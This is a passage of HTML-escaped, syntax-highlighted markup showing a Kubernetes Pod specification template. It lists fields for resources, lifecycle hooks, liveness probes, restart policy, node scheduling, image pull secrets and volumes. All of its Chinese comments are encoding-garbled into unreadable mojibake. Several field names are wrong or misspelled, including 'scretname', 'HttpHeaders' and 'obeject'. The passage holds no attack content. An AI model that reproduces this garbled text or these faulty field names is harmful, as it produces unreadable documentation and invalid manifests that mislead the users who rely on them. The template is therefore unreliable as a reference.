&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;cpu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string    &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#Cpuçš„é™åˆ¶ï¼Œå•ä½ä¸ºcoreæ•°ï¼Œå°†ç”¨äºdocker run --cpu-shareså‚æ•°&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;memory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å†…å­˜é™åˆ¶ï¼Œå•ä½å¯ä»¥ä¸ºMib/Gibï¼Œå°†ç”¨äºdocker run --memoryå‚æ•°&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#èµ„æºè¯·æ±‚çš„è®¾ç½®&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;cpu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string   &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#Cpuè¯·æ±‚ï¼Œå®¹å™¨å¯åŠ¨çš„åˆå§‹å¯ç”¨æ•°é‡&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;memory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å†…å­˜è¯·æ±‚,å®¹å™¨å¯åŠ¨çš„åˆå§‹å¯ç”¨æ•°é‡&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;lifecycle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ç”Ÿå‘½å‘¨æœŸé’©å­&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;postStart&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å®¹å™¨å¯åŠ¨åç«‹å³æ‰§è¡Œæ­¤é’©å­,å¦‚æœæ‰§è¡Œå¤±è´¥,ä¼šæ ¹æ®é‡å¯ç­–ç•¥è¿›è¡Œé‡å¯&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;preStop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å®¹å™¨ç»ˆæ­¢å‰æ‰§è¡Œæ­¤é’©å­,æ— è®ºç»“æœå¦‚ä½•,å®¹å™¨éƒ½ä¼šç»ˆæ­¢&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;livenessProbe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¯¹Podå†…å„å®¹å™¨å¥åº·æ£€æŸ¥çš„è®¾ç½®ï¼Œå½“æ¢æµ‹æ— å“åº”å‡ æ¬¡åå°†è‡ªåŠ¨é‡å¯è¯¥å®¹å™¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       ã€€ &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¯¹Podå®¹å™¨å†…æ£€æŸ¥æ–¹å¼è®¾ç½®ä¸ºexecæ–¹å¼&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string] &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#execæ–¹å¼éœ€è¦åˆ¶å®šçš„å‘½ä»¤æˆ–è„šæœ¬&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;httpGet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¯¹Podå†…ä¸ªå®¹å™¨å¥åº·æ£€æŸ¥æ–¹æ³•è®¾ç½®ä¸ºHttpGetï¼Œéœ€è¦åˆ¶å®šPathã€port&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;number&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;scheme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;HttpHeaders&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tcpSocket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¯¹Podå†…ä¸ªå®¹å™¨å¥åº·æ£€æŸ¥æ–¹å¼è®¾ç½®ä¸ºtcpSocketæ–¹å¼&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;number&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;initialDelaySeconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å®¹å™¨å¯åŠ¨å®Œæˆåé¦–æ¬¡æ¢æµ‹çš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;timeoutSeconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    ã€€ã€€    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¯¹å®¹å™¨å¥åº·æ£€æŸ¥æ¢æµ‹ç­‰å¾…å“åº”çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ç§’ï¼Œé»˜è®¤1ç§’&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;periodSeconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     ã€€ã€€    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¯¹å®¹å™¨ç›‘æ§æ£€æŸ¥çš„å®šæœŸæ¢æµ‹æ—¶é—´è®¾ç½®ï¼Œå•ä½ç§’ï¼Œé»˜è®¤10ç§’ä¸€æ¬¡&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;successThreshold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;failureThreshold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;securityContext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;privileged&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;restartPolicy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Always | Never | OnFailure] &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#Podçš„é‡å¯ç­–ç•¥&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;nodeName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#è®¾ç½®NodeNameè¡¨ç¤ºå°†è¯¥Podè°ƒåº¦åˆ°æŒ‡å®šåˆ°åç§°çš„nodeèŠ‚ç‚¹ä¸Š&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;nodeSelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;obeject&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#è®¾ç½®NodeSelectorè¡¨ç¤ºå°†è¯¥Podè°ƒåº¦åˆ°åŒ…å«è¿™ä¸ªlabelçš„nodeä¸Š&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;imagePullSecrets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#Pullé•œåƒæ—¶ä½¿ç”¨çš„secretåç§°ï¼Œä»¥keyï¼šsecretkeyæ ¼å¼æŒ‡å®š&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;hostNetwork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#æ˜¯å¦ä½¿ç”¨ä¸»æœºç½‘ç»œæ¨¡å¼ï¼Œé»˜è®¤ä¸ºfalseï¼Œå¦‚æœè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºä½¿ç”¨å®¿ä¸»æœºç½‘ç»œ&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#åœ¨è¯¥podä¸Šå®šä¹‰å…±äº«å­˜å‚¨å·åˆ—è¡¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string   &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å…±äº«å­˜å‚¨å·åç§° ï¼ˆvolumesç±»å‹æœ‰å¾ˆå¤šç§ï¼‰&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;emptyDir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;{}&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ç±»å‹ä¸ºemtyDirçš„å­˜å‚¨å·ï¼Œä¸PodåŒç”Ÿå‘½å‘¨æœŸçš„ä¸€ä¸ªä¸´æ—¶ç›®å½•ã€‚ä¸ºç©ºå€¼&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;hostPath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string  &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ç±»å‹ä¸ºhostPathçš„å­˜å‚¨å·ï¼Œè¡¨ç¤ºæŒ‚è½½Podæ‰€åœ¨å®¿ä¸»æœºçš„ç›®å½•&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string      ã€€ã€€       &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#Podæ‰€åœ¨å®¿ä¸»æœºçš„ç›®å½•ï¼Œå°†è¢«ç”¨äºåŒæœŸä¸­mountçš„ç›®å½•&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       ã€€ã€€ã€€&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ç±»å‹ä¸ºsecretçš„å­˜å‚¨å·ï¼ŒæŒ‚è½½é›†ç¾¤ä¸å®šä¹‰çš„secretå¯¹è±¡åˆ°å®¹å™¨å†…éƒ¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;scretname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string  &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;items&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;configMap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ç±»å‹ä¸ºconfigMapçš„å­˜å‚¨å·ï¼ŒæŒ‚è½½é¢„å®šä¹‰çš„configMapå¯¹è±¡åˆ°å®¹å™¨å†…éƒ¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;items&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
